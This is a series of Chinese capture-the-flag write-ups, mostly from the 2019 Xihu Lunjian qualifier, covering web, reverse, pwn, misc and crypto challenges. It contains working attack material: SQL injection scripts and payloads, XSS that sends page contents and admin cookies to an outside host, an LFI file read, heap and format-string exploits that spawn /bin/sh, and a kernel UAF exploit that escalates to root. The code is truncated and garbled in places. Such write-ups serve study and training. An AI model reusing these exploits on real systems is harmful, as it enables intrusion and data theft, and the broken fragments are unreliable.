content=r.get(url+'user.php').content balance2=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance2:\"+str(balance2) if balance-2333==balance2: return True else: return False ans=\"\" for i in xrange(1,100): for j in chars: username=str(time.time())+\"' or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#\"%(i,ord(j)) #print username password='123' data='user='+username+'&pass='+password if register(data)==True: print i,j if check(data)==True: ans+=j print ans break 截图如下： 14.Guestbook 类型：WEB 分值：400分 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 然后是沙盒： //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; 发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行 然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。 但是location很容易绕过例如window['locat'+'ion'].href 所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下： window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://106.75.103.149:8888/index.php \", false); xhr.send(); a=xhr.responseText; window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a); 能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址： 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 最后修正payload如下： 16.方舟计划 类型：WEB 分值：400分 首先扫描发现在注册时手机那一栏存在报错注入 username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or'&password='admin'=''#&repassword='admin'=''# 可以获得账户密码 登录进去发现是ffpm读取任意文件 然后读取etc/passwd 被过滤了 稍微绕过一下就能读了 得到用户名s0m3b0dy 在其home目录下读取到flag文件 二、REVERSE 2.填数游戏 类型：REVERSE 分值：200分 逆向一看就是个数独游戏，主要就是把原来的9*9找出来 里面有一块初始化数独，那个地方看出来是 他的数独题目就如下一样，然后找个网站解一下， 然后输入时候把存在的项变成0就行 5.apk crack 类型：REVERSE 分值：300分 本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程 可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。 这个验证函数非常长，笔者也没看懂。Simple类中有两个字节数组，一个用于存储输入，把它命名为input；另一个数组初始为空，把它命名为empty。 使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。 此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag flag：clo5er 17.溯源 类型：REVERSE 分值：200分 首先是输入长度为200字节，然后每两个字节转化为1个字节，得到100字节的输出。 根据后面的比较可以知道，这100字节分别为0-99这100个数。后面按照特定的顺序将0所在的位置和其上下左右的某个位置的数进行交换。验证经过交换后的数据刚好是0-99顺序排列。 大体思路是构造输入为0-99，得到交换后的数据，可以知道交换的映射关系，然后反过来根据输出为0-100，求输入。 data = '' for i in range(100): high = i/0x10 low = i%0x10 data += chr(65+high) + chr(65+low) print data #output of 0-99 f = open('./result', 'rb') d = f.read() f.close() from zio import * dict = {} for i in range(100): value = l32(d[i*4:i*4+4]) if value > 100: print hex(value) dict[value] = i data = '' for i in range(100): high = dict[i]/0x10 low = dict[i]%0x10 data += chr(65+high) + chr(65+low) print data 三、PWN 3.easyheap 类型：PWN 分值：200分 在edit的时候可以堆溢出，因为堆中有指针，因此只要覆盖指针即可任意地址读写。 因为开启了PIE，可以通过覆盖指针的最低字节进行泄露。 from threading import Thread from zio import * target = './easyheap' target = ('120.132.66.76', 20010) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def create_note(io, size, content): io.read_until('Choice:') io.writeline('1') io.read_until(':') io.writeline(str(size)) io.read_until(':') io.writeline(content) def edit_note(io, id, size, content): io.read_until('Choice:') io.writeline('2') io.read_until(':') io.writeline(str(id)) io.read_until(':') io.writeline(str(size)) io.read_until(':') io.write(content) def list_note(io): io.read_until('Choice:') io.writeline('3') def remove_note(io, id): io.read_until('Choice:') io.writeline('4') io.read_until(':') io.writeline(str(id)) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #0 create_note(io, 0xa0, 'b'*0x90) #1 create_note(io, 0xa0, 'c'*0x90) #2 create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #3 remove_note(io, 2) edit_note(io, 0, 0xb9, 'a'*0xb0+l64(0xa0)+'xd0') list_note(io) io.read_until('id:1,size:160,content:') leak_value = l64(io.readline()[:-1].ljust(8, 'x00')) base = leak_value - 0x3c4b78 system = base + 0x0000000000045390 free_hook = base + 0x00000000003C67A8 edit_note(io, 0, 0xc0, 'a'*0xb0+l64(0xa0)+l64(free_hook)) edit_note(io, 1, 8, l64(system)) print hex(system) print hex(free_hook) remove_note(io, 3) interact(io) exp(target) 9.BabyDriver 类型：pwn 分值：450分 0x00 前言 首先题目给了一套系统环境，利用qemu启动，nc连接比赛环境后会得到一个低权限的shell，同时题目给了一个babyDriver.ko，通过insmod将驱动加载进系统，先进行环境搭建，我们使用的是qemu，根据题目给的boot.sh可以得到qemu的启动命令。 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu，这里有可能会报一个KVM的错误，这里需要开启虚拟机/宿主机的虚拟化功能。 http://p0.qhimg.com/t01b4e7c9581908c7d5.png 启动后我们可以进入当前系统，如果要调试的话，我们需要在qemu启动脚本里加一条参数-gdb tcp::1234 -S，这样系统启动时会挂起等待gdb连接，进入gdb，通过命令 Target remote localhost:1234 Continue 就可以远程调试babyDriver.ko了。 0x01 漏洞分析 通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能 关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。 __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4) { _fentry__(filp, command, arg, a4); v5 = v4; if ( (_DWORD)command == 65537 )//COMMAND需要为0x10001 { kfree(babydev_struct.device_buf);//释放初始化空间 LODWORD(v6) = _kmalloc(v5, 37748928LL);//申请用户可控空间 babydev_struct.device_buf = v6; babydev_struct.device_buf_len = v5; printk(\"alloc donen\", 37748928LL); result = 0LL; } else { printk(&unk_2EB, v4); result = -22LL; } return result; } 所以这里我们申请的buffer可控，再仔细看write和read函数，都做了严格的判断控制，似乎漏洞不在这里。 if ( babydev_struct.device_buf )//判断buf必须有值 { result = -2LL; if ( babydev_struct.device_buf_len > v4 )//判断malloc的空间大小必须大于用户读写空间大小 正如之前所说，这个漏洞是一个伪条件竞争引发的UAF，也就是说，我们通过open申请两个设备对象A和B，这时候释放设备对象A，通过close关闭，会发现设备对象B在使用设备对象A的buffer空间。这是因为A和B在使用同一个全局变量。 因此，释放设备A后，当前全局变量指向的空间成为释放状态，但通过设备对象B可以调用write/read函数读写该空间的内容。 我们就能构造一个简单的poc，通过open申请设备对象A和B，ioctl对A和B初始化一样大小的空间，通过kmalloc申请的空间初始化后都为0，随后我们通过close的方法关闭设备对象A，这时候再通过write，向设备对象B的buffer写入。 首先会将buffer的值交给rdi，并且做一次检查。 .text:00000000000000F5 ; 7: if ( babydev_struct.device_buf ) .text:00000000000000F5 mov filp, cs:babydev_struct.device_buf .text:00000000000000FC test rdi, rdi .text:00000000000000FF jz short loc_125 rdi寄存器存放的就是buffer指针。 可以看到，指针指向的空间的值已经不是初始化时候覆盖的全0了。 当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。 在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。 0x02 Exploit 既然这片空间是释放的状态，那么我们就可以在这个空间覆盖对象，同时，我们可以通过对设备B的write/read操作，达到对这个内核对象的读写能力，ling提到了tty_struct结构体，这是Linux驱动通信一个非常重要的数据结构，关于tty_struct结构体的内容可以去网上搜到。 于是整个问题就比较明朗了，我们可以通过这个漏洞来制造一个hole，这个hole的大小可以通过ioctl控制，我们将其控制成tty_struct结构体的大小0x2e0，随后close关闭设备A，通过open(/dev/ptmx)的方法申请大量的tty_struct结构体，确保这个结构体能够占用到这个hole，之后通过对设备B调用write/read函数完成对tty_struct结构体的控制。 首先我们按照上面思路，编写一个简单的poc。 fd = open(\"/dev/babydev\",O_RDWR); fd1 = open(\"/dev/babydev\",O_RDWR); //init babydev_struct printf(\"Init buffer for tty_struct,%dn\",sizeof(tty)); ioctl(fd,COMMAND,0x2e0); ioctl(fd1,COMMAND,0x2e0); 当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。 接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake oprations，关键是修改其中的ioctl指针，最后达成提权效果。 首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。 当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。 unsigned long rop_chain[] = { poprdiret, 0x6f0, // cr4 with smep disabled native_write_cr4, get_root_payload, swapgs, 0, // dummy iretq, get_shell, user_cs, user_rflags, base + 0x10000, user_ss}; 解决了SMEP，我们就能完成最后的提权了。至此，我们可以将整个利用过程按照如下方式完成，首先利用设备A和B，close设备A，释放buffer，同时设备B占用同一个buffer空间，用tty_struct对象占位，然后设备B的write/read函数可以完成对tty_struct的读写。 至此，我们要构造fake struct来控制rip。 我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。 当然，这个ioctl的设备对象不能是设备B，而是需要tty_struct喷射时所使用的的设备对象，tty_struct的喷射使用open方法完成。 for(i=0;i由于tty_operations->ioctl被修改，转而去执行stack pivot，从而获得控制rip的能力，这样通过stack pivot，就可以进入我们rop chain了。 之后我们通过get root payload来完成提权。 root_payload(void) { commit_creds(prepare_kernel_cred(0)); } 由于这道题目的环境没有KASLR，所以内核地址都没有变化，可以直接写死，当然，如果内核地址有变化也没有关系，通过设备B的read方法可以读到内核地址，算出基址，再加上偏移，一样可以得到commit_cred和prepare_kernel_cred的地址。 最后通过get shell完成提权，获得root权限。 18.NotFormat 类型：PWN 分值：250分 明显的格式化，在print之后直接调用exit退出了。和0ctf的easyprintf有点类似，参考http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html。与easyprintf不同的是这个题目是静态编译的，程序中没有system函数，因此构造了一个裸的rop去获取shell。 from threading import Thread import operator from zio import * target = './NotFormat' target = ('123.59.71.3', 20020) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def format_write(writes, index): printed = 0 payload = '' for where, what in sorted(writes.items(), key=operator.itemgetter(1)): delta = (what - printed) & 0xffff if delta > 0: if delta >16)&0xffff writes[2] = pop_rdi_ret&0xffff writes[3] = (pop_rdi_ret>>16)&0xffff writes[4] = (fake_rsp+0x18)&0xffff writes[5] = ((fake_rsp+0x18)>>16)&0xffff writes[6] = read_buff&0xffff writes[7] = (read_buff>>16)&0xffff d = format_write(writes, 13+6) print len(d) d += '%'+str(fake_rsp-0x20)+'s' d = d.ljust(13*8, 'a') d += l64(malloc_hook) + l64(malloc_hook+2) d += l64(fake_rsp) + l64(fake_rsp+2) d += l64(fake_rsp+8) + l64(fake_rsp+10) d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12) print len(d) io.gdb_hint() io.read_until('!') io.writeline(d) pop_rax_ret = 0x00000000004C2358 pop_rdx_rsi_ret = 0x0000000000442c69 syscall = 0x000000000043EE45 rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8) rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0) rop+= l64(pop_rax_ret) + l64(0x3b) rop += l64(syscall) rop += '/bin/shx00' rop += '/bin/shx00' rop += '/bin/shx00' io.writeline(rop) interact(io) exp(target) 三、MISC 4.传感器1 类型：MISC 分值：100分 差分曼彻斯特 from Crypto.Util.number import * id1 = 0x8893CA58 msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556 msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656 print hex(msg1 ^ msg2).upper() s = bin(msg2)[6:] print s r=\"\" tmp = 0 for i in xrange(len(s)/2): c = s[i*2] if c == s[i*2 - 1]: r += '1' else: r += '0' print hex(int(r,2)).upper() 6.warmup 类型：MISC 分值：100分 看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint 猜测是盲水印工具：https://github.com/chishaxie/BlindWaterMark python27 bwm.py decode fuli.png fuli2.png res.png 12.badhacker 类型：MISC 分值：200分 首先看到pcap中IRC交流 意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5 This server 就是irc服务器 扫描端口 发现 http://202.5.20.47:8923 这个服务是开的 这里有个脑洞，服务器不支持host为ip的请求，只能讲host改为其他的，如提示的misc.ichunqiu.com 所以，在操作系统Host表中添加DNS，将misc.ichunqiu.com解析成http://202.5.20.47:8923/ 然后对这个服务器进行目录爆破，爆出mysql.bak 这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。 于是扩大搜索范围，搜索r，发现有8处 将其行号排序，然后计算md5即可。 两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。 13.传感器2 类型：MISC 分值：250分 对#0X02 4D 88 45 AB F3 41 19 除了最后一位是校验位，其他都是控制命令和ID号，直接CRC8就可以 更改88 45 AB F3为 再计算就可以了 上图是ID为88 45 AB F3的 15.embarrass 类型：MISC 分值：300分 四、Crypto 11.partial 类型：Crypto 分值：300分 Coppersmith Attack 已知部分p，其实给的有点多，给576bit的就足够了 n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9 p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000 p_fake = p+0x10000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake & (2^pbits-2^kbits) print \"upper %d bits (of %d bits) is given\" % (pbits-kbits, pbits) PR. = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root = n^0.4 print x0 + pbar flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng} "},"articals/xihulunjian2019.html":{"url":"articals/xihulunjian2019.html","title":"2019西湖论剑预选赛","keywords":"","body":"2019西湖论剑预选赛 题目类型： 类型 年份 难度 官方赛事题 2019 中 网上公开WP: https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA https://www.anquanke.com/post/id/176136/ https://www.jianshu.com/p/c14970447ddd https://blog.csdn.net/qq_41420747/article/details/89076214 题目下载： 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw 本站备份WP： 感谢：冷逸、fIappy[暂时未联系到作者] Web 作者：冷逸 babyt3 题目地址：http://61.164.47.198:10000/ 打开地址，发现提示： include $_GET['file'] 目测为文件包含，尝试读index.php的源码， http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php 还原后如下： 发现提示，其实右击查看源代码也可以看到.. base64解码后得到dir.php 读dir.php http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php 得知该文件可以列目录，尝试列目录 http://61.164.47.198:10000/dir.php?dir=/ 这样得到ffffflag_1s_Her4文件 使用file读取，得到flag http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4 Breakout 题目地址：http://61.164.47.198:10001/ 打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下： 第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令. 使用如下payload绕过过滤 然后在report哪里提交 http://61.164.47.198:10001/main.php 有个验证码，爆破脚本如下 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode('utf-8')) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == ' b0f446 ': print(i) break 自己服务器监听 nc -lvvp 8000 可得到cookie 然后执行命令，使用ceye外带flag 猜猜flag是什么 题目地址： http://61.164.47.198:10002/ dir扫描得到 发现.DS_Store 泄露 脱下来 发现e10adc3949ba59abbe56e057f20f883e目录 继续扫描，发现git文件 使用Githack下载后得到三个文件 BackupForMySite.zip index.php lengzhu.jpg 用明文攻击解开压缩包BackupForMySite.zip，得到里面的code 注：只能使用bindzip进行压缩，反正我7-zip压缩的失败 或者使用rbkcrack进行明文攻击 解开后得到code is 后面是一个随机串 带入首页得到一串数字 然后使用使用php_mt_seed：你的数字 然后访问/flag/得到的数字.txt 得到flag 二.Crypto： 作者：fIappy [暂时未联系到作者] 题目: 哈夫曼之谜题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom题目描述:打开压缩包后得到一个文本文件,内容如下 11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 a:4 d:9 g:1 f:5 l:1 0:7 5:9 {:1 }:1 根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题题目分析:对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin 对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可 参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359 代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组. #include \"pch.h\" #include const int maxvalue = 200; const int maxbit = 200; const int maxn = 200; #include \"stdio.h\" #include \"stdlib.h\" using namespace std; struct haffnode { char ch; int weight; int flag; int parent; int leftchild; int rightchild; }; struct code { int bit[maxn]; int start; int weight; char ch; }; void haffman(int weight[], char text[], int n, haffnode hafftree[]) { int j, m1, m2, x1, x2, i; for (i = 0; i 运行结果: 三.re 作者：fIappy [暂时未联系到作者] 1.junk_instruction 题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom 从题目名字看出,这是一个含有垃圾指令例如花指令的程序. 而且从文件图标来看,显然是一个mfc写的程序. 打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确. 通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll 找到check按钮的处理函数: 查看该函数 从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个: call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可. 然后f5反编译: v2 = (const WCHAR *)sub_401570(&a1); v17 = (void *)sub_4030A0(v2); v13 = v17; LOBYTE(v70) = 1; v3 = (void *)sub_401570(v17); sub_403000((int)&v60, v3); LOBYTE(v70) = 3; sub_4012A0(&v18); v19 = (char *)unknown_libname_1(&v60); v54 = v19; v16 = v19 + 1; v54 += strlen(v54); v14 = ++v54 - (v19 + 1); v12 = v54 - (v19 + 1); v68 = 0; memset(&v69, 0, 0x27u); strncpy(&v68, v19, v54 - (v19 + 1)); if ( sub_402AF0(&v68) ) // 判断输入长度 { v57 = 0; v59 = 0; LABEL_7: v58 = v59; } else { v63 = 1919252337;//这里是rc4密钥 v64 = 1769306484; v65 = 28783; v66 = 0; memset(&v67, 0, 0xF5u); v61 = 0; memset(&v62, 0, 0xFFu); v7 = 0; memset(&v8, 0, 0x1FFu); v53 = (const char *)&v63; v10 = (int *)((char *)&v63 + 1); v53 += strlen(v53); v9 = ++v53 - ((const char *)&v63 + 1); v6 = v53 - ((const char *)&v63 + 1); v5 = &v63; sub_402CA0(&v61); v56 = &v68; v15 = &v69; v56 += strlen(v56); v11 = ++v56 - &v69; sub_402E80(v20, &v61, &v68, v56 - &v69); for ( i = 31; i >= 0; --i ) { if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) ) { v59 = 0; goto LABEL_7; } } v58 = 1; } LOBYTE(v70) = 0; sub_403060((int)&v60); v70 = -1; sub_4012A0(&a1); return v58; } 通过分析程序先将输入进行了逆序,再使用rc4加密. rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可 void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3) { char v3; // ST1B_1 int v4; // [esp+8h] [ebp-114h] signed int i; // [esp+10h] [ebp-10Ch] signed int j; // [esp+10h] [ebp-10Ch] char v7; // [esp+18h] [ebp-104h] char v8; // [esp+19h] [ebp-103h] v4 = 0; v7 = 0; memset(&v8, 0, 0xFFu); for ( i = 0; i 进行比较判断 加密函数:该函数也是被花指令的,使用相同方法处理即可 int __stdcall sub_402E80(int a1, int a2, unsigned int a3) { int result; // eax char v4; // ST1B_1 int v5; // [esp+Ch] [ebp-18h] unsigned int i; // [esp+10h] [ebp-14h] int v7; // [esp+14h] [ebp-10h] v7 = 0; v5 = 0; for ( i = 0; i 而check函数的这段正是用于比较的数组 最种解密如下: import base64 key = \"qwertyuiop\" res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] res = res[::-1] tmp = \"\" for i in res: tmp += chr(i) tmp = base64.b64encode(tmp) print tmp ff = \"f250e3d75820847d427f3af11a783379\" flag = ['*']*32 for i in range(16): flag[i] = ff[31-i] flag[31-i] = ff[i] print \"flag{%s\"%(\"\".join(flag))+'}' W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo= flag{973387a11fa3f724d74802857d3e052f} 2.Testre 题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom ida打开文件,main函数如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { void *ptr; // ST10_8 __int64 v5; // [rsp+18h] [rbp-28h] char v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+3Ch] [rbp-4h] v7 = 0; v5 = 256LL; sub_400D00((__int64)&v6, 0x11uLL); ptr = malloc(0x100uLL); sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL); free(ptr); return 0LL; } 跟进sub_400D00,发现是个接受输入的函数 跟进sub_400700: for ( i = 0LL; i 这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到 while ( v20 >= 6; v21 /= 58; v27 /= v9; if ( !j ) break; } ++v20; v18 = j; } 这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面 if ( *v30 > n + v17 - j ) { if ( v17 ) // 不会执行到这里面,又是干扰分析 { c = 61; memset(encode_input, '1', v17); memset(v26, c, v17); } v20 = v17; while ( j 到这里发现有2个数组,分别是 .rodata:0000000000400EB0 byte_400EB0 db '1' ; DATA XREF: sub_400700+446↑r .rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0 .rodata:0000000000400EEB align 10h .rodata:0000000000400EF0 ; char byte_400EF0[] .rodata:0000000000400EF0 byte_400EF0 db 'A' ; DATA XREF: sub_400700+464↑r .rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0 显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析. 仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的 最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp 对其进行base58解码就是flag: import base58 as bs bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp') #output: base58_is_boring base58通过pip install base58即可安装 3.easyCpp 题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom 这个要求对 c++的 stl 比较熟悉 直接来到main: for ( i = 0; i >::push_back(&our_input, &v25[4 * i]); } for ( j = 0; j >::push_back(&fib_list, &input_begin); } 接受输入和生成斐波那契数列 std::vector>::push_back(&v20, v25); v7 = std::back_inserter>>(&v20); input_end = std::vector>::end(&our_input); input_begin = std::vector>::begin(&our_input); v9 = __gnu_cxx::__normal_iterator>>::operator+(&input_begin, 1LL);// 对input每个元素加1 std::transform>>,std::back_insert_iterator>>,main::{lambda(int)#1}>( v9, input_end, v7, v25); std::vector>::vector(&v23, input_end, v10); std::vector>::end(&v20); std::vector>::begin(&v20); std::accumulate>>,std::vector>,main::{lambda(std::vector>,int)#2}>((unsigned __int64)&input_begin); std::vector>::operator=(&v21, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v23); if ( (unsigned __int8)std::operator!=>(&v21, &fib_list) )// 必须相同 { puts(\"You failed!\"); exit(0); } transform是把v9的每个元素通过匿名函数进行转换,结果存入v20 进入transform: v4 = (int *)__gnu_cxx::__normal_iterator>>::operator*(&input_begin_1); v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加 v5 = std::back_insert_iterator>>::operator*(&v24_backinsert); std::back_insert_iterator>>::operator=(v5, &v11); __gnu_cxx::__normal_iterator>>::operator++(&input_begin_1); std::back_insert_iterator>>::operator++(&v24_backinsert); 再进入 main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);: __int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2) { return (unsigned int)(**a1 + a2); } 这下就知道这个就是把输入和输入的第一个元素相加 接着看std::accumulate,这个程序的std::accumulate和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析 根据 std::vector>::operator=(&v25, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v27); if ( (unsigned __int8)std::operator!=>(&v25, &fib_list) )// 必须相同 我们需要分析v25的内容,通过下断std::vector>::~vector(&input_begin);再查看v25: gef➤ x/10gx $rsp+0x90 0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50 0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000 0x7fffc6f61680: 0x0000000000000000 0x0000000000000000 0x7fffc6f61690: 0x0000000000000000 0x0000000000000000 0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000 地址为0x0000000002007f10, 再查看堆: …….] Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE) [0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…] Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE) [0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…] Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE) [0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…] Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE) 